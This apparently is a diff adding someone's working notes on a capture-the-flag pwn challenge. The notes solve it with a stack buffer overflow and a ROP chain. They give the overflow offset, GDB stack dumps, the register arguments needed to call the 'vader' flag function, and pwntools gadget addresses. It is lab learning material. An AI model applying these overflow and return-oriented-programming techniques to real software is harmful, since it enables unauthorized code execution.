@@ -1,0 +1,93 @@
+It looks like if you can somehow call the vader function with certain args, it will print the flag for you.
+
+Main input is allowed to be 100 bytes long, but only 0x20 bytes reserved for the buffer.
+
+I gave it the following input:
+asdfasdfasdfasdfasdfasdfasdfabcdefghijklmnopqrstuvwxy
+
+Ended up with a retq which i guess pops some data from stack near rbp.
+
+rbp ended up with 0x6c6b6a6968676665
+
+"lkjihgfe"
+
+Vader function at 0x40146b, which is k<shift out>(.  Can't exactly type out the 0x14, so gonna need to make
+a script to help me with this.
+
+Script made, breaks after sending in the input into the buffer.
+
+sp = ...3d10
+bp = ...3d30
+
+All A's to start with, followed by address of the vader function.
+
+sp for vader is 3cd8.  3d10 - 3cd8 = 0x38 bytes till the beginning of the old buffer.
+
+the load params from 3cd8-0x38 = 
+
+Stack before the return to vader.  $bp points to 0xbe0, $sp points to $bc0
+gef➤  x/40dx $sp
+0x7ffe76b51bc0:	0x61616161	0x62626262	0x63636363	0x64646464
+0x7ffe76b51bd0:	0x65656565	0x66666666	0x67676767	0x68686868
+0x7ffe76b51be0:	0x69696969	0x6a6a6a6a	0x0040146b	0x00000000
+0x7ffe76b51bf0:	0x41414141	0x42424242	0x43434343	0x44444444
+0x7ffe76b51c00:	0x45454545	0x46464646	0x47474747	0x48484848
+0x7ffe76b51c10:	0x49494949	0x4a4a4a4a	0x86b0000a	0x8bf782a7
+0x7ffe76b51c20:	0x004010a0	0x00000000	0x76b51cd0	0x00007ffe
+0x7ffe76b51c30:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffe76b51c40:	0xb15030b1	0x740b6fcd	0xc67e30b1	0x753ca4aa
+0x7ffe76b51c50:	0x00000000	0x00000000	0x00000000	0x00000000
+
+gef➤  x/40dx $sp
+0x7ffe76b51bc0:	0x61616161	0x62626262	0x63636363	0x64646464
+0x7ffe76b51bd0:	0x65656565	0x66666666	0x67676767	0x68686868
+0x7ffe76b51be0:	[  base pointer popped   ]	[ vader func ptr         ]
+0x7ffe76b51bf0:	0x41414141	0x42424242	0x43434343	0x44444444
+0x7ffe76b51c00:	0x45454545	0x46464646	0x47474747	0x48484848
+0x7ffe76b51c10:	0x49494949	0x4a4a4a4a	0x86b0000a	0x8bf782a7
+0x7ffe76b51c20:	0x004010a0	0x00000000	0x76b51cd0	0x00007ffe
+0x7ffe76b51c30:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffe76b51c40:	0xb15030b1	0x740b6fcd	0xc67e30b1	0x753ca4aa
+0x7ffe76b51c50:	0x00000000	0x00000000	0x00000000	0x00000000
+
+vader stack frame:
+gef➤  x/40dx $sp
+0x7ffe76b51b88:	0x930c86fa	0x00007f65	0x004010a0	0x00000000
+0x7ffe76b51b98:	0x00401600	0x00000000	0x76b51be0	0x00007ffe
+0x7ffe76b51ba8:	0x004010a0	0x00000000	0x76b51cd0	0x00007ffe
+0x7ffe76b51bb8:	0x004015f3	0x00000000	0x61616161	0x62626262
+0x7ffe76b51bc8:	0x63636363	0x64646464	0x65656565	0x66666666
+0x7ffe76b51bd8:	0x67676767	0x68686868	0x69696969	0x6a6a6a6a
+0x7ffe76b51be8:	BP 0x69696969	0x6a6a6a6a	0x41414141	0x42424242
+0x7ffe76b51bf8:	0x43434343	0x44444444	0x45454545	0x46464646
+0x7ffe76b51c08:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
+0x7ffe76b51c18:	0x86b0000a	0x8bf782a7	0x004010a0	0x00000000
+
+Need to put rdi == 'DARK'
+Need to have rsi == 'S1D3'
+rdx == "OF"
+rcx == TH3
+r8 == FORC3
+
+These registers are the regular AMD64 System V function argument registers
+
+0x4011d9 is gadget: pop r8; retn
+0x4011cd is gadget: pop rcx; pop rdx; retn
+
+I'm not seeing obvious gadgets for all registers I need to populate...
+
+Using pwn tools to generate gadgets for us returns the following:
+Gadget(0x4011d9, ['pop r8', 'ret'], ['r8'], 0x8)
+Gadget(0x40165b, ['pop rdi', 'ret'], ['rdi'], 0x8)
+Gadget(0x401659, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0xc)
+Gadget(0x4011ce, ['pop rdx', 'ret'], ['rdx'], 0x8)
+Gadget(0x4011cd, ['pop rcx', 'pop rdx', 'ret'], ['rcx', 'rdx'], 0xc)
+
+Gadget for rdi isn't a real instruction, it's an odd alignment to get that one to work!
+That is why we need to use gadget finder scripts!
+
+I added all the gadgest and pointed the registers to all the strings already in memory.
+
+I have issues running the challenge directly / via debugger.  It crashes in the printf
+function printing out the flag.  But if i connect it to the docker instance, it
+successfully prints out the flag...
